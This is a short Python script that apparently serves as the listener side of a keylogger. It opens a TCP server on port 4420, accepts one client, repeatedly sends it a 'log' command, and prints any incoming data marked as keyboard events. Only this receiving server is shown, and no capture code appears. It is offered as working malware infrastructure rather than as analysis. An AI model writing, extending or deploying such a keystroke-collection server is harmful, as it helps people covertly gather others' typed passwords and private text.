import subprocess,socket,os
import time
# Enter IP and Port here
HOST = '127.0.0.1'
PORT = 4420
# Configure socket connection
z = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
z.bind((HOST, PORT))
z.listen(5)
print('> Started main server: ' + str(HOST) + ' (' + str(PORT))
x,y = z.accept()
#print('> Client connected: ' + str(y) + 'the x is : ' + str(x))
# Wake up
while True:
    data = x.recv(1024)
    if data.decode() == 'ready': x.send('log'.encode())
    if data.decode().__contains__('KeyboardEvent'): 
        print('keys received')
        x.send('log'.encode())
        print(data.decode())
        time.sleep(1)
        
    else: 
        print('waiting on keys')
        print(data.decode())
        #z.send('log'.encode())
        time.sleep(1)